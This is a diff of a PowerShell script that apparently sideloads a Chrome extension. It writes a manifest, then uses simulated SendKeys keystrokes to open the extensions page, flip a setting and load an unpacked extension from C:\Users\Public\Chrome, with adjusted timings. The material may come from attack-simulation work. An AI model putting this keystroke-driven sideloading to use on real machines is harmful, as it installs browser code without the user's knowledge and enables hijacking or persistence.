@@ -139,17 +139,17 @@ $manifest | Out-File -FilePath "$DirPath/manifest.json" -Encoding utf8 -Force
 # Send keys to manually open chrome and add extension
 $wshell = New-Object -ComObject wscript.shell
 Start-Process chrome.exe example.com
-sleep 3
+sleep 5
 $wshell.AppActivate("chrome.exe")
 $wshell.SendKeys("{TAB}") ;sleep -m 100
 $wshell.SendKeys("{TAB}") ;sleep -m 100
 $wshell.SendKeys("{TAB}") ;sleep -m 100
 $wshell.SendKeys("chrome://extensions/") ;sleep -m 100
+$wshell.SendKeys("{ENTER}") ;sleep 3
+$wshell.SendKeys("{TAB}") ;sleep -m 100
+$wshell.SendKeys(" ") ;sleep 2
+$wshell.SendKeys("{TAB}") ;sleep -m 100
 $wshell.SendKeys("{ENTER}") ;sleep 2
-$wshell.SendKeys("{TAB}") ;sleep -m 100
-$wshell.SendKeys(" ") ;sleep 1
-$wshell.SendKeys("{TAB}") ;sleep -m 100
-$wshell.SendKeys("{ENTER}") ;sleep 1
 $wshell.SendKeys("C:\Users\Public\Chrome");sleep -m 100
 $wshell.SendKeys("{ENTER}") ;sleep -m 200
 $wshell.SendKeys("{BACKSPACE}") ;sleep -m 100
